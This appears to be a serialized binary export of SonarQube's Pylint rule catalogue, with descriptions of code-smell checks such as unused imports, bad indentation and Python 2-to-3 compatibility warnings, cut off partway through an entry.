Pylint:R0922î
PylintR0922!Abstract class used too few times"MINOR*py2R0922:BUsed when an abstract class is used less than X times as ancestor.Z
CODE_SMELL
ú
Pylint:R0921ã
PylintR0921Abstract class not referenced"MINOR*py2R0921:=Used when an abstract class is not used as ancestor anywhere.Z
CODE_SMELL
…
Pylint:W0702∏
PylintW0702No exception type(s) specified"MINOR*py2W0702:ËUsed when an except clause doesn't specify exceptions
               type to catch.
               <p>Catching exceptions should be as precise as
               possible. The type of exceptions that can be raised should be known in
               advance. Using catch-all-constructs hides potential
               errors (including syntax ones), defeats the purpose of
               knowing the type of error that occurred, and prohibits the use of
               tailored responses.</p>Z
CODE_SMELL
‚
Pylint:W0601—
PylintW0601-Global variable undefined at the module level"MINOR*py2W0601:sUsed when a variable is defined through the "global" statement but the variable is not defined in the module scope.Z
CODE_SMELL
∆
Pylint:W0602µ
PylintW0602Unassigned global variable"MINOR*py2W0602:jUsed when a variable is defined through the "global" statement but no assignment to this variable is done.Z
CODE_SMELL
Â
Pylint:E0604‘
PylintE06044Invalid object in __all__, must contain only strings"MINOR*py2E0604:oUsed when an invalid (non-string) object occurs in __all__.
       <p>This rule was added in Pylint 0.27.0.</p>Z
CODE_SMELL
¢
Pylint:E0603ë
PylintE0603"Undefined variable name in __all__"MINOR*py2E0603:>Used when an undefined variable name is referenced in __all__.Z
CODE_SMELL
¯
Pylint:R0913Á
PylintR0913Too many arguments"MINOR*py2R0913:£Used when a function or method takes too many arguments.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS107'>S107</a> instead.</p>Z
CODE_SMELL
≥
Pylint:R0912¢
PylintR0912Too many branches"MINOR*py2R0912:ﬂUsed when a function or method has too many branches, making it hard to follow.
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AFunctionComplexity'>FunctionComplexity</a> instead.</p>Z
CODE_SMELL
∏
Pylint:C0330ß
PylintC0330Bad continuation"MINOR*py2C0330:f<p>Used when continued lines are badly indented.</p>
      <p>This rule was added in Pylint 1.2.1.</p>Z
CODE_SMELL
≈
Pylint:R0915¥
PylintR0915Too many statements"MINOR*py2R0915:pUsed when a function or method has too many statements. You should then split it in smaller functions / methods.Z
CODE_SMELL
ñ
Pylint:R0914Ö
PylintR0914Too many local variables"MINOR*py2R0914:<Used when a function or method has too many local variables.Z
CODE_SMELL
•
Pylint:W0716î
PylintW0716Invalid exception operation"MINOR*py2W0716:«Used when an operation is done against an exception, but the operation is not valid for the exception in question. Usually emitted when having binary operations between exceptions in except handlers.Z
CODE_SMELL
°
Pylint:R0911ê
PylintR0911Too many return statements"MINOR*py2R0911:ƒUsed when a function or method has too many return statement, making it hard to follow.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1142'>S1142</a> instead.</p>Z
CODE_SMELL
©
Pylint:W0715ò
PylintW0715?Exception arguments suggest string formatting might be intended"MINOR*py2W0715:ßUsed when passing multiple arguments to an exception constructor, the first of them a string literal containing what appears to be placeholders intended for formattingZ
CODE_SMELL
}
Pylint:W0612m
PylintW0612Unused variable"MINOR*py2W0612:-Used when a variable is defined but not used.Z
CODE_SMELL
Ñ
Pylint:W0613t
PylintW0613Unused argument"MINOR*py2W0613:4Used when a function or method argument is not used.Z
CODE_SMELL
÷
Pylint:C0204≈
PylintC0204%Metaclass class method first argument"MINOR*py2C0204:ÓUsed when a metaclass class method has a first argument named differently than the value specified in valid-metaclass-classmethod-first-arg option (default to "mcs"), recommended to easily differentiate them from regular instance methods.Z
CODE_SMELL
≈
Pylint:C0325¥
PylintC0325Unnecessary parentheses"MINOR*py2C0325:ÎUsed when a single item in parentheses follows an if, for, or other keyword.
      <p>This rule was added in Pylint 1.1.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1110'>S1110</a> instead.</p>Z
CODE_SMELL
≤
Pylint:E1701°
PylintE1701@Async context manager doesn't implement __aenter__ and __aexit__"MINOR*py2E1701:ØUsed when an async context manager is used with an object that does not implement the async context management protocol. This message can't be emitted when using Python < 3.5.Z
CODE_SMELL
É
Pylint:W0611s
PylintW0611Unused import"MINOR*py2W0611:5Used when an imported module or variable is not used.Z
CODE_SMELL
’
Pylint:C0203ƒ
PylintC02034Metaclass method should have "mcs" as first argument"MINOR*py2C0203:ﬁUsed when a metaclass method has a first argument named differently than the value specified in valid-classmethod-first-arg option (default to "cls"), recommended to easily differentiate them from regular instance methods.Z
CODE_SMELL
í
Pylint:C0324Å
PylintC0324Comma not followed by a space"MINOR*py2C0324:3Used when a comma (",") is not followed by a space.Z
CODE_SMELL
π
Pylint:C0205®
PylintC0205/Class __slots__ should be a non-string iterable"MINOR*py2C0205:HUsed when a class __slots__ is a simple string, rather than an iterable.Z
CODE_SMELL
Ô
Pylint:C0326ﬁ
PylintC0326VWrong number of spaces around an operator, bracket, or comma, or before a block opener"MINOR*py2C0326:WUsed when a wrong number of spaces is used around an operator, bracket or block opener.Z
CODE_SMELL
†
Pylint:C0327è
PylintC0327Mixed line endings LF and CRLF"MINOR*py2C0327:@Used when there are mixed (LF and CRLF) newline signs in a file.Z
CODE_SMELL
í
Pylint:C0328Å
PylintC0328Unexpected line ending format"MINOR*py2C0328:3Used when there is different newline than expected.Z
CODE_SMELL
¬
Pylint:R0901±
PylintR0901Too many ancestors"MINOR*py2R0901:nUsed when class has too many parent classes, try to reduce this to get a simpler (and so easier to use) class.Z
CODE_SMELL
—
Pylint:R0902¿
PylintR0902Too many instance attributes"MINOR*py2R0902:sUsed when class has too many instance attributes, try to reduce this to get a simpler (and so easier to use) class.Z
CODE_SMELL
§
Pylint:R0903ì
PylintR0903Too few public methods"MINOR*py2R0903:LUsed when class has too few public methods, so be sure it's really worth it.Z
CODE_SMELL
«
Pylint:R0904∂
PylintR0904Too many public methods"MINOR*py2R0904:nUsed when class has too many public methods, try to reduce this to get a simpler (and so easier to use) class.Z
CODE_SMELL
Ä
Pylint:C0200Ô
PylintC0200@Consider using enumerate instead of iterating with range and len"MINOR*py2C0200:~Emitted when code that iterates with range and len is encountered. Such code can be simplified by using the enumerate builtin.Z
CODE_SMELL
∏
Pylint:C0321ß
PylintC0321(More than one statement on a single line"MINOR*py2C0321:Õ<p>Used when more than one statement are found on the same line.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AOneStatementPerLine'>OneStatementPerLine</a> instead.</p>Z
CODE_SMELL
Õ
Pylint:C0202º
PylintC02020Class method should have "cls" as first argument"MINOR*py2C0202:⁄Used when a class method has a first argument named differently than the value specified in valid-classmethod-first-arg option (default to "cls"), recommended to easily differentiate them from regular instance methods.Z
CODE_SMELL
ﬁ
Pylint:C0323Õ
PylintC0323 Operator not followed by a space"MINOR*py2C0323:|Used when one of the following operator (!= | <= | == | >= | < | > | = | \+= |-= | \*= | /= | %) is not followed by a space.Z
CODE_SMELL
√
Pylint:W0604≤
PylintW0604.Using the global statement at the module level"MINOR*py2W0604:SUsed when you use the "global" statement at the module level since it has no effectZ
CODE_SMELL
±
Pylint:C0201†
PylintC0201EConsider iterating the dictionary directly instead of calling .keys()"MINOR*py2C0201:©Emitted when the keys of a dictionary are iterated through the .keys() method. It is enough to just iterate through the dictionary itself, as in "for key in dictionary".Z
CODE_SMELL
ﬁ
Pylint:C0322Õ
PylintC0322 Operator not preceded by a space"MINOR*py2C0322:|Used when one of the following operator (!= | <= | == | >= | < | > | = | \+= |-= | \*= | /= | %) is not preceded by a space.Z
CODE_SMELL
Ú
Pylint:W0603·
PylintW0603Using the global statement"MINOR*py2W0603:ïUsed when you use the "global" statement to update a global variable. Pylint just try to discourage this usage. That doesn't mean you cannot use it !Z
CODE_SMELL
¶
Pylint:W0621ï
PylintW0621 Redefining name from outer scope"MINOR*py2W0621:DUsed when a variable's name hides a name defined in the outer scope.Z
CODE_SMELL
â
Pylint:W0622y
PylintW0622Redefining built-in"MINOR*py2W0622:5Used when a variable or function override a built-in.Z
CODE_SMELL
Æ
Pylint:W0623ù
PylintW0623$Redefining name in exception handler"MINOR*py2W0623:HUsed when an exception handler assigns the exception to an existing nameZ
CODE_SMELL
Ÿ
Pylint:R1704»
PylintR1704#Redefining argument with local name"MINOR*py2R1704:ÛUsed when a local name is redefining an argument, which might suggest a potential error. This is taken in account only for a handful of name binding operations, such as for iteration, with statement assignment and exception handler assignment.Z
CODE_SMELL
¿
Pylint:R1705Ø
PylintR1705!Unnecessary "else" after "return""MINOR*py2R1705:‹Used in order to highlight an unnecessary block of code following an if containing a return statement. As such, it will warn when it encounters an else following a chain of ifs, all of them containing a return statement.Z
CODE_SMELL
™
Pylint:R1701ô
PylintR1701!Consider merging isinstance calls"MINOR*py2R1701:GUsed when multiple consecutive isinstance calls can be merged into one.Z
CODE_SMELL
ï
Pylint:R1706Ñ
PylintR1706Consider using ternary"MINOR*py2R1706:=Used when one of known pre-python 2.5 ternary syntax is used.Z
CODE_SMELL
˙
Pylint:R1707È
PylintR1707Disallow trailing comma tuple"MINOR*py2R1707:öIn Python, a tuple is actually created by the comma symbol, not by the parentheses. Unfortunately, one can actually create a tuple by misplacing a trailing comma, which can lead to potential weird bugs in your code. You should always use parentheses explicitly for creating a tuple.Z
CODE_SMELL
 
Pylint:C0111π
PylintC0111Missing docstring"MINOR*py2C0111:ˆUsed when a module, function, class or method has no docstring. Some special methods like __init__ doesn't necessary require a docstring.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1720'>S1720</a> instead.</p>Z
CODE_SMELL
ù
Pylint:C0112å
PylintC0112Empty docstring"MINOR*py2C0112:ÀUsed when a module, function, class or method has an empty docstring (it would be too easy ;).
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1720'>S1720</a> instead.</p>Z
CODE_SMELL
ó
Pylint:R1703Ü
PylintR1703Simplifiable if statement"MINOR*py2R1703:<Used when an if statement can be replaced with 'bool(test)'.Z
CODE_SMELL
é
Pylint:C0113~
PylintC0113Useless negation"MINOR*py2C0113:=Used when a boolean expression contains an unneeded negation.Z
CODE_SMELL
Œ
Pylint:R1702Ω
PylintR1702Too many nested blocks"MINOR*py2R1702:vUsed when a function or a method has too many nested blocks. This makes the code less understandable and maintainable.Z
CODE_SMELL
¡
Pylint:W0614∞
PylintW0614"Unused import from wildcard import"MINOR*py2W0614:]Used when an imported module or variable is not used from a `'from X import *'` style import.Z
CODE_SMELL
Ê
Pylint:W0633’
PylintW0633#Attempting to unpack a non-sequence"MINOR*py2W0633:ÄUsed when something which is not a sequence is used in an unpack assignment.
        <p>This rule was added in Pylint 1.1.0.</p>Z
CODE_SMELL
∞
Pylint:W1602ü
PylintW1602basestring built-in referenced"MINOR*py2W1602:PUsed when the basestring built-in function is referenced (missing from Python 3)Z
CODE_SMELL
®
Pylint:W1603ó
PylintW1603buffer built-in referenced"MINOR*py2W1603:LUsed when the buffer built-in function is referenced (missing from Python 3)Z
CODE_SMELL
»
Pylint:W0512∑
PylintW0512FSource line cannot be decoded using the specified source file encoding"MINOR*py2W0512:øUsed when a source line cannot be decoded using the specified source file encoding. This message can't be emitted when using Python >= 3.0.
        <p>This rule was added in Pylint 1.0.0.</p>Z
CODE_SMELL
ÿ
Pylint:W0632«
PylintW0632#Possible unbalanced tuple unpacking"MINOR*py2W0632:sUsed when there is an unbalanced tuple unpacking in assignment.
        <p>This rule was added in Pylint 1.1.0.</p>Z
CODE_SMELL
¶
Pylint:W1601ï
PylintW1601apply built-in referenced"MINOR*py2W1601:KUsed when the apply built-in function is referenced (missing from Python 3)Z
CODE_SMELL
ˆ
Pylint:W0199Â
PylintW0199Assert called on a 2-uple"MINOR*py2W0199:öA call of assert on a tuple will always evaluate to true if the tuple is not empty, and will always evaluate to false if it is. Did you mean 'assert x,y'?Z
CODE_SMELL
á
Pylint:W0511w
PylintW0511Task marker found"MINOR*py2W0511:5Used when a warning note as FIXME or XXX is detected.Z
CODE_SMELL
Î
Pylint:W0631⁄
PylintW0631&Using possibly undefined loop variable"MINOR*py2W0631:ÇUsed when a loop variable (i.e. defined by a for loop or a list comprehension or a generator expression) is used outside the loop.Z
CODE_SMELL
∞
Pylint:E0633ü
PylintE0633#Attempting to unpack a non-sequence"MINOR*py2E0633:KUsed when something which is not a sequence is used in an unpack assignmentZ
CODE_SMELL
ö
Pylint:E0632â
PylintE0632Unbalanced tuple unpacking"MINOR*py2E0632:>Used when there is an unbalanced tuple unpacking in assignmentZ
CODE_SMELL
ô
Pylint:C0102à
PylintC0102Black listed name"MINOR*py2C0102:≈Used when the name is listed in the black list
               (unauthorized names).
               <p>Pylint can be customized to help enforce coding
               guidelines that discourage or forbid use of certain names for
               variables, functions, etc. These names are specified with the
               bad-names option. This message is raised whenever a name is in the
               list of names defined with the bad-names option.</p>Z
CODE_SMELL
 
Pylint:C0103π
PylintC0103Invalid name"MINOR*py2C0103:˚Used when the name doesn't conform to naming rules associated to its type (constant, variable, class...).
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS116'>S116</a>, <a href='/coding_rules#rule_key=python%3AS117'>S117</a>, <a href='/coding_rules#rule_key=python%3AS101'>S101</a>,
      <a href='/coding_rules#rule_key=python%3AS100'>S100</a>, <a href='/coding_rules#rule_key=python%3AS1542'>S1542</a>, <a href='/coding_rules#rule_key=python%3AS1578'>S1578</a> instead.</p>Z
CODE_SMELL
®
Pylint:W1613ó
PylintW1613xrange built-in referenced"MINOR*py2W1613:LUsed when the xrange built-in function is referenced (missing from Python 3)Z
CODE_SMELL
À
Pylint:W0403∫
PylintW0403Relative import"MINOR*py2W0403:zUsed when an import relative to the package directory is detected. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
y
Pylint:W0404i
PylintW0404Reimport"MINOR*py2W0404:0Used when a module is reimported multiple times.Z
CODE_SMELL
§
Pylint:W1614ì
PylintW1614__coerce__ method defined"MINOR*py2W1614:IUsed when a __coerce__ method is defined (method is not used by Python 3)Z
CODE_SMELL
ã
Pylint:W0402{
PylintW0402Uses of a deprecated module"MINOR*py2W0402:/Used a module marked as deprecated is imported.Z
CODE_SMELL
∂
Pylint:W1611•
PylintW1611!StandardError built-in referenced"MINOR*py2W1611:SUsed when the StandardError built-in function is referenced (missing from Python 3)Z
CODE_SMELL
™
Pylint:W1612ô
PylintW1612unicode built-in referenced"MINOR*py2W1612:MUsed when the unicode built-in function is referenced (missing from Python 3)Z
CODE_SMELL
}
Pylint:W0401m
PylintW0401Wildcard import"MINOR*py2W0401:-Used when `from module import *` is detected.Z
CODE_SMELL
©
Pylint:W0642ò
PylintW0642Invalid assignment in method"MINOR*py2W0642:KInvalid assignment to self or cls in instance or class method respectively.Z
CODE_SMELL
Ê
Pylint:W0640’
PylintW0640Cell variable defined in loop"MINOR*py2W0640:ÜA variable used in a closure is defined in a loop. This will result in all closures using the same value for the closed-over variable.Z
CODE_SMELL
ˇ
Pylint:W0641Ó
PylintW0641Possibly unused variable"MINOR*py2W0641:§Used when a variable is defined but might not be used. The possibility comes from the fact that locals() might be used, which could consume or not the said variableZ
CODE_SMELL
®
Pylint:W1610ó
PylintW1610reduce built-in referenced"MINOR*py2W1610:LUsed when the reduce built-in function is referenced (missing from Python 3)Z
CODE_SMELL
«
Pylint:E0402∂
PylintE04022Attempted relative import beyond top-level package"MINOR*py2E0402:SUsed when a relative import tries to access too many levels in the current package.Z
CODE_SMELL
Å
Pylint:E0401q
PylintE0401Import error"MINOR*py2E0401:4Used when pylint has been unable to import a module.Z
CODE_SMELL
§
Pylint:W1608ì
PylintW1608long built-in referenced"MINOR*py2W1608:JUsed when the long built-in function is referenced (missing from Python 3)Z
CODE_SMELL
Æ
Pylint:W1609ù
PylintW1609raw_input built-in referenced"MINOR*py2W1609:OUsed when the raw_input built-in function is referenced (missing from Python 3)Z
CODE_SMELL
¢
Pylint:W1604ë
PylintW1604cmp built-in referenced"MINOR*py2W1604:IUsed when the cmp built-in function is referenced (missing from Python 3)Z
CODE_SMELL
¨
Pylint:W1606õ
PylintW1606execfile built-in referenced"MINOR*py2W1606:NUsed when the execfile built-in function is referenced (missing from Python 3)Z
CODE_SMELL
§
Pylint:W1607ì
PylintW1607file built-in referenced"MINOR*py2W1607:JUsed when the file built-in function is referenced (missing from Python 3)Z
CODE_SMELL
ê
Pylint:W1503ˇ
PylintW1503Redundant unittest assert"MINOR*py2W1503:¥The first argument of assertTrue and assertFalse is a condition. If a constant is passed as parameter, that condition will be always true. In this case a warning should be emitted.Z
CODE_SMELL
®
Pylint:W1605ó
PylintW1605coerce built-in referenced"MINOR*py2W1605:LUsed when the coerce built-in function is referenced (missing from Python 3)Z
CODE_SMELL
¬
Pylint:W1624±
PylintW1624-Indexing exceptions will not work on Python 3"MINOR*py2W1624:SIndexing exceptions will not work on Python 3. Use `exception.args[index]` instead.Z
CODE_SMELL
¿
Pylint:W1622Ø
PylintW1622#Called a next() method on an object"MINOR*py2W1622:[Used when an object's next() method is called (Python 3 uses the next() built- in function)Z
CODE_SMELL
£
Pylint:W1625í
PylintW1625Raising a string exception"MINOR*py2W1625:GUsed when a string exception is raised. This will not work on Python 3.Z
CODE_SMELL
‹
Pylint:W1501À
PylintW1501Invalid mode for open"MINOR*py2W1501:ÑPython supports: r, w, a[, x] modes with b, +, and U (only with r) options. See http://docs.python.org/2/library/functions.html#openZ
CODE_SMELL
Ò
Pylint:W1502‡
PylintW1502)Using datetime.time in a boolean context."MINOR*py2W1502:ÖUsing datetime.time in a boolean context can hide subtle bugs when the time they represent matches midnight UTC. This behaviour was fixed in Python 3.5. See http://bugs.python.org/issue13936 for reference. This message can't be emitted when using Python >= 3.5.Z
CODE_SMELL
Ú
Pylint:W1623·
PylintW1623.Assigning to a class's __metaclass__ attribute"MINOR*py2W1623:ÅUsed when a metaclass is specified by assigning to __metaclass__ (Python 3 specifies the metaclass as a class statement argument)Z
CODE_SMELL
„
Pylint:W0410“
PylintW0410:__future__ import is not the first non docstring statement"MINOR*py2W0410:gPython 2.5 and greater require __future__ import to be the first non docstring statement in the module.Z
CODE_SMELL
º
Pylint:W1620´
PylintW1620Calling a dict.iter*() method"MINOR*py2W1620:]Used for calls to dict.iterkeys(), itervalues() or iteritems() (Python 3 lacks these methods)Z
CODE_SMELL
º
Pylint:W1621´
PylintW1621Calling a dict.view*() method"MINOR*py2W1621:]Used for calls to dict.viewkeys(), viewvalues() or viewitems() (Python 3 lacks these methods)Z
CODE_SMELL
ß
Pylint:C0121ñ
PylintC0121Singleton comparison"MINOR*py2C0121:QUsed when an expression is compared to singleton values like True, False or None.Z
CODE_SMELL
Ú
Pylint:E1507·
PylintE15079Env manipulation functions does not support type argument"MINOR*py2E1507:wEnv manipulation functions support only string type arguments. See https://docs.python.org/3/library/os.html#os.getenv.Z
CODE_SMELL
ˆ
Pylint:W1619Â
PylintW1619!division w/o __future__ statement"MINOR*py2W1619:íUsed for non-floor division w/o a float literal or ``from __future__ import division`` (Python 3 returns a float for int division unconditionally)Z
CODE_SMELL
ø
Pylint:C0123Æ
PylintC01235Using type() instead of isinstance() for a typecheck."MINOR*py2C0123:«The idiomatic way to perform an explicit typecheck in Python is to use isinstance(x, Y) rather than type(x) == Y, type(x) is Y. Though there are unusual situations where these give different results.Z
CODE_SMELL
®
Pylint:W1617ó
PylintW1617__setslice__ method defined"MINOR*py2W1617:KUsed when a __setslice__ method is defined (method is not used by Python 3)Z
CODE_SMELL
Ì
Pylint:W1618‹
PylintW16187import missing `from __future__ import absolute_import`"MINOR*py2W1618:tUsed when an import is not accompanied by ``from __future__ import absolute_import`` (default behaviour in Python 3)Z
CODE_SMELL
¯
Pylint:C0122Á
PylintC0122Misplaced comparison constant"MINOR*py2C0122:òUsed when the constant is placed on the left side of a comparison. It is usually clearer in intent to place it in the right hand side of the comparison.Z
CODE_SMELL
}
Pylint:W0406m
PylintW0406Module imports itself"MINOR*py2W0406:'Used when a module is importing itself.Z
CODE_SMELL
®
Pylint:W1615ó
PylintW1615__delslice__ method defined"MINOR*py2W1615:KUsed when a __delslice__ method is defined (method is not used by Python 3)Z
CODE_SMELL
®
Pylint:W1616ó
PylintW1616__getslice__ method defined"MINOR*py2W1616:KUsed when a __getslice__ method is defined (method is not used by Python 3)Z
CODE_SMELL
ù
Pylint:W1635å
PylintW1635unichr built-in referenced"MINOR*py2W1635:AUsed when the unichr built-in is referenced (Use chr in Python 3)Z
CODE_SMELL
¥
Pylint:W1633£
PylintW1633round built-in referenced"MINOR*py2W1633:YUsed when the round built-in is referenced (backwards-incompatible semantics in Python 3)Z
CODE_SMELL
©
Pylint:W1634ò
PylintW1634intern built-in referenced"MINOR*py2W1634:MUsed when the intern built-in is referenced (Moved to sys.intern in Python 3)Z
CODE_SMELL
—
Pylint:W1636¿
PylintW1636*map built-in referenced when not iterating"MINOR*py2W1636:eUsed when the map built-in is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
º
Pylint:W0301´
PylintW0301Unnecessary semicolon"MINOR*py2W0301:eUsed when a statement is ended by a semi-colon (";"), which isn't necessary (that's python, not C ;).Z
CODE_SMELL
û
Pylint:W1630ç
PylintW1630__cmp__ method defined"MINOR*py2W1630:FUsed when a __cmp__ method is defined (method is not used by Python 3)Z
CODE_SMELL
¥
Pylint:W1632£
PylintW1632input built-in referenced"MINOR*py2W1632:YUsed when the input built-in is referenced (backwards-incompatible semantics in Python 3)Z
CODE_SMELL
…
Pylint:C1801∏
PylintC1801>Do not use `len(SEQUENCE)` to determine if a sequence is empty"MINOR*py2C1801:»Used when Pylint detects that len(sequence) is being used inside a condition to determine if a sequence is empty. Instead of comparing the length to 0, rely on the fact that empty sequences are false.Z
CODE_SMELL
∆
Pylint:E0301µ
PylintE0301__iter__ returns non-iterator"MINOR*py2E0301:gUsed when an __iter__ method returns something which is not an iterable (i.e. has no `__next__` method)Z
CODE_SMELL
Ó
Pylint:E0302›
PylintE0302#Unexpected special method signature"MINOR*py2E0302:àEmitted when a special method was defined with an invalid number of parameters. If it has too few or too many, it might not work at all.Z
CODE_SMELL
æ
Pylint:E0303≠
PylintE0303,__len__ does not return non-negative integer"MINOR*py2E0303:PUsed when a __len__ method returns something which is not a non-negative integerZ
CODE_SMELL
¶
Pylint:C1001ï
PylintC1001Old-style class defined."MINOR*py2C1001:ÀUsed when a class is defined that does not inherit from another class and does not inherit explicitly from "object". This message can't be emitted when using Python >= 3.0.
      <p>This rule was added in Pylint 1.0.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1722'>S1722</a> instead.</p>Z
CODE_SMELL
µ
Pylint:W1509§
PylintW1509GUsing preexec_fn keyword which may be unsafe in the presence of threads"MINOR*py2W1509:´The preexec_fn parameter is not safe to use in the presence of threads in your application. The child process could deadlock before exec is called. If you must use it, keep it trivial! Minimize the number of libraries you call into.https://docs.python.org/3/library/subprocess.html#popen-constructorZ
CODE_SMELL
û
Pylint:W1628ç
PylintW1628__hex__ method defined"MINOR*py2W1628:FUsed when a __hex__ method is defined (method is not used by Python 3)Z
CODE_SMELL
õ
Pylint:W1507ä
PylintW1507;Using copy.copy(os.environ). Use os.environ.copy() instead."MINOR*py2W1507:ùos.environ is not a dict object but proxy object, so shallow copy has still effects on original object. See https://bugs.python.org/issue15373 for reference.Z
CODE_SMELL
ï
Pylint:W1508Ñ
PylintW1508*Invalid type in env manipulation functions"MINOR*py2W1508:®Env manipulation functions return None or str values. Supplying anything different as a default may cause bugs. See https://docs.python.org/3/library/os.html#os.getenv.Z
CODE_SMELL
¶
Pylint:W1629ï
PylintW1629__nonzero__ method defined"MINOR*py2W1629:JUsed when a __nonzero__ method is defined (method is not used by Python 3)Z
CODE_SMELL
È
Pylint:W1505ÿ
PylintW1505Using deprecated method"MINOR*py2W1505:èThe method is marked as deprecated and will be removed in a future version of Python. Consider looking for an alternative in the documentation.Z
CODE_SMELL
ﬁ
Pylint:W1626Õ
PylintW1626reload built-in referenced"MINOR*py2W1626:ÅUsed when the reload built-in function is referenced (missing from Python 3). You can use instead imp.reload or importlib.reload.Z
CODE_SMELL
•
Pylint:W1506î
PylintW1506*threading.Thread needs the target function"MINOR*py2W1506:∏The warning is emitted when a threading.Thread class is instantiated without the target function being passed. By default, the first parameter is the group param, not the target param.Z
CODE_SMELL
ü
Pylint:W1627é
PylintW1627__oct__ method defined"MINOR*py2W1627:GUsed when an __oct__ method is defined (method is not used by Python 3)Z
CODE_SMELL
÷
Pylint:W1646≈
PylintW1646$non-text encoding used in str.decode"MINOR*py2W1646:pUsed when using str.encode or str.decode with a non-text encoding. Use codecs module to handle arbitrary codecs.Z
CODE_SMELL

Pylint:W1402ﬂ
PylintW1402'Anomalous Unicode escape in byte string"MINOR*py2W1402:ÜUsed when an escape like \u is encountered in a byte string where it has no effect.
      <p>This rule was added in Pylint 0.26.0.</p>Z
CODE_SMELL
Ó
Pylint:W1644›
PylintW1644__rdiv__ method defined"MINOR*py2W1644:îUsed when a __rdiv__ method is defined. Using `__rtruediv__` and setting__rdiv__ = __rtruediv__ should be preferred.(method is not used by Python 3)Z
CODE_SMELL
ò
Pylint:W1647á
PylintW1647sys.maxint removed in Python 3"MINOR*py2W1647:8Used when accessing sys.maxint. Use sys.maxsize instead.Z
CODE_SMELL
»
Pylint:W1403∑
PylintW1403Implicit string concatenation"MINOR*py2W1403:iString literals are implicitly concatenated in a literal iterable definition : maybe a comma is missing ?Z
CODE_SMELL
È
Pylint:W1642ÿ
PylintW1642__div__ method defined"MINOR*py2W1642:êUsed when a __div__ method is defined. Using `__truediv__` and setting__div__ = __truediv__ should be preferred.(method is not used by Python 3)Z
CODE_SMELL
ø
Pylint:W1645Æ
PylintW1645%Exception.message removed in Python 3"MINOR*py2W1645:XUsed when the message attribute is accessed on an Exception. Use str(exception) instead.Z
CODE_SMELL
Ô
Pylint:W1643ﬁ
PylintW1643__idiv__ method defined"MINOR*py2W1643:ïUsed when an __idiv__ method is defined. Using `__itruediv__` and setting__idiv__ = __itruediv__ should be preferred.(method is not used by Python 3)Z
CODE_SMELL
¶
Pylint:W0311ï
PylintW0311Bad indentation"MINOR*py2W0311:UUsed when an unexpected number of indentation's tabulations or spaces has been found.Z
CODE_SMELL
ø
Pylint:W1401Æ
PylintW1401Anomalous backslash escape"MINOR*py2W1401:‚Used when a backslash is in a literal string but not as an escape.
      <p>This rule was added in Pylint 0.26.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1717'>S1717</a> instead.</p>Z
CODE_SMELL
°
Pylint:W1640ê
PylintW1640-Using the cmp argument for list.sort / sorted"MINOR*py2W1640:±Using the cmp argument for list.sort or the sorted builtin should be avoided, since it was removed in Python 3. Using either `key` or `functools.cmp_to_key` should be preferred.Z
CODE_SMELL
€
Pylint:R0401 
PylintR0401Cyclic import"MINOR*py2R0401:ãUsed when a cyclic import between two or more modules is detected.
               <p>While cyclic imports terminate and execute without
               surprises in most cases, the circular dependency often indicates a
               design issue in the code base.</p>Z
CODE_SMELL
◊
Pylint:W1639∆
PylintW1639-filter built-in referenced when not iterating"MINOR*py2W1639:hUsed when the filter built-in is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
€
Pylint:W1641 
PylintW16416Implementing __eq__ without also implementing __hash__"MINOR*py2W1641:‚Used when a class implements __eq__ but not __hash__. In Python 2, objects get object.__hash__ as the default implementation, in Python 3 objects get None as their default __hash__ implementation if they also implement __eq__.Z
CODE_SMELL
—
Pylint:W1637¿
PylintW1637*zip built-in referenced when not iterating"MINOR*py2W1637:eUsed when the zip built-in is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
’
Pylint:W1638ƒ
PylintW1638,range built-in referenced when not iterating"MINOR*py2W1638:gUsed when the range built-in is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
«
Pylint:W1657∂
PylintW16574Accessing a removed attribute on the operator module"MINOR*py2W1657:QUsed when accessing a field on operator module that has been removed in Python 3.Z
CODE_SMELL
«
Pylint:W1655∂
PylintW1655'dict.keys referenced when not iterating"MINOR*py2W1655:^Used when dict.keys is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
À
Pylint:W1656∫
PylintW1656)dict.values referenced when not iterating"MINOR*py2W1656:`Used when dict.values is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
Ã
Pylint:W1658ª
PylintW16582Accessing a removed attribute on the urllib module"MINOR*py2W1658:XUsed when accessing a field on urllib module that has been removed or moved in Python 3.Z
CODE_SMELL
Œ
Pylint:W1653Ω
PylintW1653next method defined"MINOR*py2W1653:yUsed when a next method is defined that would be an iterator in Python 2 but is treated as a normal function in Python 3.Z
CODE_SMELL
…
Pylint:W1654∏
PylintW1654(dict.items referenced when not iterating"MINOR*py2W1654:_Used when dict.items is referenced in a non-iterating context (returns an iterator in Python 3)Z
CODE_SMELL
ô
Pylint:R1719à
PylintR1719Simplifiable if expression"MINOR*py2R1719:=Used when an if expression can be replaced with 'bool(test)'.Z
CODE_SMELL
´
Pylint:W0201ö
PylintW0201"Attribute defined outside __init__"MINOR*py2W0201:GUsed when an instance attribute is defined outside the __init__ method.Z
CODE_SMELL
«
Pylint:W1651∂
PylintW16517Accessing a deprecated function on the itertools module"MINOR*py2W1651:NUsed when accessing a function on itertools that has been removed in Python 3.Z
CODE_SMELL
∫
Pylint:W1652©
PylintW16521Accessing a deprecated fields on the types module"MINOR*py2W1652:GUsed when accessing a field on types that has been removed in Python 3.Z
CODE_SMELL
Ò
Pylint:W1650‡
PylintW1650:Using str.translate with deprecated deletechars parameters"MINOR*py2W1650:uUsed when using the deprecated deletechars parameters from str.translate. Use re.sub to remove the desired charactersZ
CODE_SMELL
Ω
Pylint:R1720¨
